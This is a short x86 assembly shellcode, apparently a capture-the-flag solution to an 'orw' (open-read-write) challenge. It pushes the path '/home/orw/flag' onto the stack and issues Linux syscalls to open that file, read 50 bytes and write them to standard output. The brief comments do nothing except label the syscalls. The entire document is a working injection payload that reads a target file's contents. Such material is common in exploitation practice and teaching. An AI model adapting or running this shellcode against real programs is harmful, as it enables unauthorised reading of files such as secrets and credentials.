mov eax, 0x5
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80    ;fd = open('/home/orw/flag, 0, 0)

mov ebx, eax
mov eax, 0x03

sub esp, 0x32
mov ecx, esp    ; ecx = &buf
mov edx, 0x32
int 0x80    ; read(fd, &buf, 50)

mov eax, 0x04
mov ebx, 0x1
int 0x80    ; write(1, &buf, 50)